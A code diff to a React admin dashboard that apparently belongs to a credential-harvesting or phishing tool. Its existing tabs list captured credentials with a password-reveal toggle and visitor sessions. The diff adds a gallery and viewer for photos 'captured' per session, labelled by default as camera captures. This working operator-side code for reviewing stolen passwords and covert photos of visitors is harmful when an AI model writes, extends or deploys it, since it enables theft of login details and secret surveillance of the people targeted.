@@ -1,17 +1,94 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { Eye, EyeOff, LogOut, RefreshCw, Trash2 } from 'lucide-react';
+import { Eye, EyeOff, LogOut, RefreshCw, Trash2, X } from 'lucide-react';
 import { getApiUrl } from '../../api';
+
+type AdminPhoto = {
+  id: string;
+  session_id: string;
+  storage_key: string | null;
+  metadata: string | null;
+  capture_timestamp: string;
+};
+
+function parsePhotoMetadata(metadata: string | null) {
+  try {
+    return metadata ? JSON.parse(metadata) : {};
+  } catch {
+    return {};
+  }
+}
+
+function PhotoThumbnail({ photoId, token, alt }: { photoId: string; token: string; alt: string }) {
+  const [src, setSrc] = useState<string | null>(null);
+  const [failed, setFailed] = useState(false);
+
+  useEffect(() => {
+    let objectUrl: string | null = null;
+    let cancelled = false;
+
+    const load = async () => {
+      try {
+        const response = await fetch(getApiUrl(`/api/admin/photos/${photoId}/image`), {
+          headers: { Authorization: `Bearer ${token}` },
+        });
+        if (!response.ok) {
+          throw new Error('Failed to load photo');
+        }
+        const blob = await response.blob();
+        if (cancelled) {
+          return;
+        }
+        objectUrl = URL.createObjectURL(blob);
+        setSrc(objectUrl);
+      } catch {
+        if (!cancelled) {
+          setFailed(true);
+        }
+      }
+    };
+
+    void load();
+
+    return () => {
+      cancelled = true;
+      if (objectUrl) {
+        URL.revokeObjectURL(objectUrl);
+      }
+    };
+  }, [photoId, token]);
+
+  if (failed) {
+    return (
+      <div className="flex h-full w-full items-center justify-center bg-gray-200 text-xs text-gray-500">
+        Unavailable
+      </div>
+    );
+  }
+
+  if (!src) {
+    return (
+      <div className="flex h-full w-full items-center justify-center bg-gray-100 text-xs text-gray-400">
+        Loading...
+      </div>
+    );
+  }
+
+  return <img src={src} alt={alt} className="h-full w-full object-cover" />;
+}
 
 export default function AdminDashboard() {
   const navigate = useNavigate();
   const [credentials, setCredentials] = useState<any[]>([]);
   const [sessions, setSessions] = useState<any[]>([]);
+  const [photos, setPhotos] = useState<AdminPhoto[]>([]);
   const [analytics, setAnalytics] = useState<any>(null);
   const [isLoading, setIsLoading] = useState(true);
   const [activeTab, setActiveTab] = useState('credentials');
   const [deleteConfirm, setDeleteConfirm] = useState(false);
   const [revealedPasswords, setRevealedPasswords] = useState<Record<string, boolean>>({});
+  const [selectedPhoto, setSelectedPhoto] = useState<AdminPhoto | null>(null);
+  const adminToken = localStorage.getItem('adminToken') || '';
 
   useEffect(() => {
     const token = localStorage.getItem('adminToken');
@@ -27,9 +104,10 @@ export default function AdminDashboard() {
   const loadData = async () => {
     const token = localStorage.getItem('adminToken');
     try {
-      const [credResponse, sessResponse, analyticsResponse] = await Promise.all([
+      const [credResponse, sessResponse, photosResponse, analyticsResponse] = await Promise.all([
         fetch(getApiUrl('/api/admin/credentials'), { headers: { Authorization: `Bearer ${token}` } }),
         fetch(getApiUrl('/api/admin/sessions'), { headers: { Authorization: `Bearer ${token}` } }),
+        fetch(getApiUrl('/api/admin/photos'), { headers: { Authorization: `Bearer ${token}` } }),
         fetch(getApiUrl('/api/admin/analytics'), { headers: { Authorization: `Bearer ${token}` } }),
       ]);
 
@@ -40,6 +118,10 @@ export default function AdminDashboard() {
       if (sessResponse.ok) {
         const sessData = await sessResponse.json();
         setSessions(sessData);
+      }
+      if (photosResponse.ok) {
+        const photosData = await photosResponse.json();
+        setPhotos(Array.isArray(photosData) ? photosData : []);
       }
       if (analyticsResponse.ok) {
         const analyticsData = await analyticsResponse.json();
@@ -73,6 +155,8 @@ export default function AdminDashboard() {
       if (response.ok) {
         alert('All data has been deleted');
         setCredentials([]);
+        setPhotos([]);
+        setSelectedPhoto(null);
         setDeleteConfirm(false);
       }
     } catch (error) {
@@ -257,8 +341,76 @@ export default function AdminDashboard() {
           {/* Photos Tab */}
           {activeTab === 'photos' && (
             <div className="p-6">
-              <div className="text-center py-12 text-gray-500">
-                📷 Photo gallery would display captured images here
+              {photos.length > 0 ? (
+                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+                  {photos.map((photo) => {
+                    const metadata = parsePhotoMetadata(photo.metadata);
+                    return (
+                      <button
+                        key={photo.id}
+                        type="button"
+                        onClick={() => setSelectedPhoto(photo)}
+                        className="overflow-hidden rounded-lg border bg-white text-left shadow-sm transition hover:shadow-md"
+                      >
+                        <div className="aspect-video bg-gray-100">
+                          <PhotoThumbnail
+                            photoId={photo.id}
+                            token={adminToken}
+                            alt={`Capture from session ${photo.session_id}`}
+                          />
+                        </div>
+                        <div className="space-y-1 p-3 text-xs text-gray-600">
+                          <p className="font-semibold text-gray-800">
+                            {metadata.source || 'camera'} · {photo.session_id?.slice(-8)}
+                          </p>
+                          <p>{photo.capture_timestamp ? new Date(photo.capture_timestamp).toLocaleString() : 'Unknown time'}</p>
+                        </div>
+                      </button>
+                    );
+                  })}
+                </div>
+              ) : (
+                <div className="text-center py-12 text-gray-500">
+                  No photos captured yet
+                </div>
+              )}
+            </div>
+          )}
+
+          {selectedPhoto && (
+            <div
+              className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4"
+              onClick={() => setSelectedPhoto(null)}
+            >
+              <div
+                className="relative max-h-[90vh] w-full max-w-3xl overflow-hidden rounded-lg bg-white shadow-xl"
+                onClick={(event) => event.stopPropagation()}
+              >
+                <button
+                  type="button"
+                  onClick={() => setSelectedPhoto(null)}
+                  className="absolute right-3 top-3 rounded-full bg-white/90 p-2 text-gray-700 shadow"
+                  aria-label="Close photo"
+                >
+                  <X size={18} />
+                </button>
+                <div className="aspect-video bg-gray-100">
+                  <PhotoThumbnail
+                    photoId={selectedPhoto.id}
+                    token={adminToken}
+                    alt={`Full capture from session ${selectedPhoto.session_id}`}
+                  />
+                </div>
+                <div className="space-y-1 p-4 text-sm text-gray-700">
+                  <p><span className="font-semibold">Session:</span> {selectedPhoto.session_id}</p>
+                  <p><span className="font-semibold">Source:</span> {parsePhotoMetadata(selectedPhoto.metadata).source || 'camera'}</p>
+                  <p>
+                    <span className="font-semibold">Captured:</span>{' '}
+                    {selectedPhoto.capture_timestamp
+                      ? new Date(selectedPhoto.capture_timestamp).toLocaleString()
+                      : 'Unknown'}
+                  </p>
+                </div>
               </div>
             </div>
           )}
